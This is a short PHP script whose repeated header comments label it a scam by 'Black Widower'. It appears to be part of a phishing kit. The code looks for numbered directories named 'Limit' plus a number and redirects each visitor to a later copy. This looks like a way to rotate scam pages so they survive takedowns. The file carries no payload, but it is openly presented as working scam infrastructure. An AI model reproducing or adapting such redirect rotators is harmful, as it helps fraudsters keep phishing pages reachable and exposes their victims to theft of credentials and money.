<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/

$scam = "Limit";
for($i=0;$i<99999999999;$i++){
if(file_exists($scam.$i)){
$n = $i+2;
header('location:'.$scam.$n);
exit;
}
}
?>